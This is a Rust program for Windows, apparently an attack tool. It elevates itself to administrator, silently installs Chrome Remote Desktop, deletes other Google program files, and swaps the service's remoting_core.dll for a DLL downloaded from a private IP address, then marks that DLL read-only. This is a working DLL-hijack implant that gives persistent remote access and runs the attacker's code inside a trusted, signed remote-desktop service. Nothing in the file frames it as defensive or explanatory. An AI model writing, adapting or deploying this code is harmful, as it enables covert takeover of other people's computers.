use std::{
    ffi::OsStr, fs::{self, File}, io::{self, copy, Write}, iter::{once, Once}, os::windows::ffi::OsStrExt, path::Path, process::Command, ptr::null_mut
};

use user32::MessageBoxW;
use winapi::{ctypes::c_void, shared::winerror::ERROR_SUCCESS, um::{fileapi::{GetFileAttributesW, SetFileAttributesW}, handleapi::CloseHandle, processthreadsapi::{CreateProcessW, OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOW}, securitybaseapi::GetTokenInformation, shellapi::ShellExecuteW, synchapi::WaitForSingleObject, winbase::{CREATE_NO_WINDOW, INFINITE}, winnt::{TOKEN_ELEVATION, TOKEN_QUERY}, winuser::{MB_ICONERROR, MB_OK, SW_SHOWNORMAL}}};
use reqwest::blocking::Client;

fn is_running_as_admin() -> bool {
    unsafe {
        let mut token_handle: *mut c_void = null_mut();
        if OpenProcessToken(
            winapi::um::processthreadsapi::GetCurrentProcess(),
            TOKEN_QUERY,
            &mut token_handle,
        ) == 0
        {
            return false;
        }

        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
        let mut size = 0;

        let success = GetTokenInformation(
            token_handle,
            winapi::um::winnt::TokenElevation,
            &mut elevation as *mut _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        ) != 0;

        winapi::um::handleapi::CloseHandle(token_handle);

        success && elevation.TokenIsElevated != 0
    }
}

fn run_as_admin() {
    unsafe {
        let current_exe = std::env::current_exe().unwrap();
        let current_exe_wide: Vec<u16> = current_exe
            .to_string_lossy()
            .encode_utf16()
            .chain(Some(0))
            .collect();

        ShellExecuteW(
            null_mut(),
            "runas\0".encode_utf16().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
            current_exe_wide.as_ptr(),
            null_mut(),
            null_mut(),
            SW_SHOWNORMAL,
        );
    }
}

fn download_file(url: &str, local_path: &str) -> Result<(), Box<dyn std::error::Error>> {

    let client = Client::new();
    let response = client.get(url).send()?;
    
    if !response.status().is_success() {
        return Err(format!("Failed to download file: HTTP {}", response.status()).into());
    }

    let mut file = File::create(local_path)?;

    copy(&mut response.bytes()?.as_ref(), &mut file)?;

    println!("File downloaded successfully to: {}", local_path);

    Ok(())
}


fn main() -> io::Result<()>{
    let elevated_env_var = "RUNNING_ELEVATED";

    if std::env::var(elevated_env_var).is_err() {
        if !is_running_as_admin() {
            println!("This program requires administrator privileges.");
            unsafe {
                MessageBoxW(
                    null_mut(),
                    "Please run the program as Administrator.".encode_utf16().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
                    "Administrator Access Required".encode_utf16().chain(Some(0)).collect::<Vec<u16>>().as_ptr(),
                    MB_ICONERROR | MB_OK,
                );
            }

            std::env::set_var(elevated_env_var, "1");
            run_as_admin();

            std::process::exit(0);
        }
    }

    // Normal Code ! 

    if let Err(e) = download_chrome_remote_desktop(){
        eprintln!("Error: {}", e);
    }

    let url = "http://192.168.102.2/test.dll";

    let google_path = Path::new(r"C:\Program Files (x86)\Google");

    if !google_path.exists(){
        eprintln!("[-] Path does not exists: Check: {:?}", google_path);
        std::process::exit(0);
    }

    println!("[+] Path Exists.");


    let keep_dirs = vec!["Chrome Remote Desktop"];

    for entry in fs::read_dir(google_path)?{
        let entry = entry?;
        let path = entry.path();

        if path.is_dir(){
            if !keep_dirs.contains(&path.file_name().unwrap().to_str().unwrap()) {
                std::fs::remove_dir_all(&path)?;
                println!("Removed Directory: {:?}", path);
            }
        } else if path.is_file(){
            std::fs::remove_file(&path)?;
            println!("Removed File: {:?}", path);
        }
    }

    let current_version_path = Path::new("C:\\Program Files (x86)\\Google\\Chrome Remote Desktop\\CurrentVersion");
    let dll_path = current_version_path.join("remoting_core.dll");

    if dll_path.exists(){
        std::fs::remove_file(&dll_path)?;
        println!("[+] Removed [remoting_core.dll]");
    }  else {
        println!("[-] remoting_core.dll does not exist at the specified location.");
    }

    // Download path area !
    let download_path = r"C:\Program Files (x86)\Google\Chrome Remote Desktop\CurrentVersion\remoting_core.dll";
    println!("[*] Downloading dll file");

        if let Some(parent) = Path::new(download_path).parent() {
            std::fs::create_dir_all(parent)?;
        }
    
        match download_file(url, download_path) {
            Ok(_) => println!("Download completed!"),
            Err(e) => eprintln!("Error: {}", e),
        }
        
        let wide_path: Vec<u16> = OsStr::new(dll_path.to_str().unwrap()).encode_wide().chain(Some(0)).collect();
            unsafe {
                pub const TRUE: i32 = 1;
                if SetFileAttributesW(wide_path.as_ptr(), winapi::um::winnt::FILE_ATTRIBUTE_READONLY) == TRUE {
                    let attributes = GetFileAttributesW(wide_path.as_ptr());
                    if attributes != ERROR_SUCCESS {
                        if (attributes & winapi::um::winnt::FILE_ATTRIBUTE_READONLY) != 0 {
                            println!("File attributes set to read-only for: {:?}", dll_path);
                        } else {
                            println!("Failed to set file attributes to read-only.");
                        }
                    }
                }
            }        


    Ok(())
}


fn download_chrome_remote_desktop() -> Result<(), Box<dyn std::error::Error>> {
    let url = "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi";
    let local_path = Path::new("C:\\Temp\\chromeremotedesktophost.msi");

    // Ensure the directory exists
    if let Some(parent) = local_path.parent() {
        fs::create_dir_all(parent)?;
    }

    println!("[*] Downloading MSI from: {}", url);

    // Download the file
    let client = Client::new();
    let mut response = client.get(url).send()?;

    if !response.status().is_success() {
        return Err(format!("Failed to download file: HTTP {}", response.status()).into());
    }

    // Save the file locally
    let mut file = File::create(&local_path)?;
    copy(&mut response, &mut file)?;

    println!("[+] Successfully downloaded to {:?}", local_path);

    // Verify the file exists and is accessible
    if !local_path.exists() {
        return Err("The downloaded file does not exist.".into());
    }

    let metadata = fs::metadata(&local_path)?;
    println!("Downloaded file size: {} bytes", metadata.len());
    if metadata.len() == 0 {
        return Err("The downloaded file is empty.".into());
    }

    // Install the MSI
    // match install_msi_with_powershell(local_path.to_str().expect("Error")) {
    //     Ok(_) => println!("Installation completed successfully."),
    //     Err(e) => {
    //         println!("Installation failed with error: {:?}", e);
    //         return Err(e.into());
    //     }
    // }

    let result = execute_msi(local_path.to_str().expect("Error converting"));

    match result{
        Ok(_) => println!("[+] Installation Success"),
        Err(e) => {
            eprintln!("{}", e);
            return Err(e.into()); 
        }
    }

    println!("[+] Installation completed successfully.");
    Ok(())
}

fn execute_msi(exe_path: &str) -> Result<(), Box<dyn std::error::Error>>{
    
    let command = format!(r#"Start-Process {}"#, exe_path);

    let wide_command: Vec<u16> = OsStr::new(&command).encode_wide().chain(once(0)).collect();

    unsafe{
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        
        let success = CreateProcessW(
            null_mut(),                       
            wide_command.as_ptr() as *mut _,  
            null_mut(),                       
            null_mut(),                       
            false as i32,                     
            CREATE_NO_WINDOW,                 
            null_mut(),                       
            null_mut(),                  
            &mut si,                
            &mut pi,       
        );

        if success == 0{
            return Err("Failed to create process to install MSI".into());
        }
        println!("[*] MSI INSTALLAION SUCCESS");

        winapi::um::synchapi::WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
   Ok(())
}

